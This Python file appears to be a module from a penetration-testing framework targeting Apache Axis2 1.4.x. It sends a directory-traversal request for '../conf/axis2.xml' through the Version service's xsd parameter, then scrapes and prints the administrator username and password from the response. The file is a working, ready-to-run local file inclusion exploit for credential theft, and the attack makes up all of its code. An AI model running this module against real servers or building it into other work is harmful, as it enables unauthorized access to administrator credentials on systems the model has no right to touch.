from auxiliary import Auxiliary
from re import findall
from log import LOG
import utility

class Auxiliary:

    def __init__(self):
        self.name = 'Axis2 1.4.1 LFI'
        self.versions = ['1.4']
        self.flag = 'ax-lfi'

    def check(self, fingerprint):
        """
        """

        if fingerprint.version in self.versions:
            return True
        return False

    def run(self, fingerengine, fingerprint):
        """ Exploits a trivial LFI in Axis2 1.4.x to grab the
        admin username and password

        http://www.exploit-db.com/exploits/12721/
        """

        utility.Msg("Attempting to retrieve admin username and password...")

        base = 'http://{0}:{1}'.format(fingerengine.options.ip, fingerprint.port)
        uri = '/axis2/services/Version?xsd=../conf/axis2.xml'

        response = utility.requests_get(base + uri)
        if response.status_code == 200:

            username = findall("userName\">(.*?)<", response.content)
            password = findall("password\">(.*?)<", response.content)
            if len(username) > 0 and len(password) > 0:
                utility.Msg("Found credentials: {0}:{1}".format(username[0], password[0]),
                                                         LOG.SUCCESS)
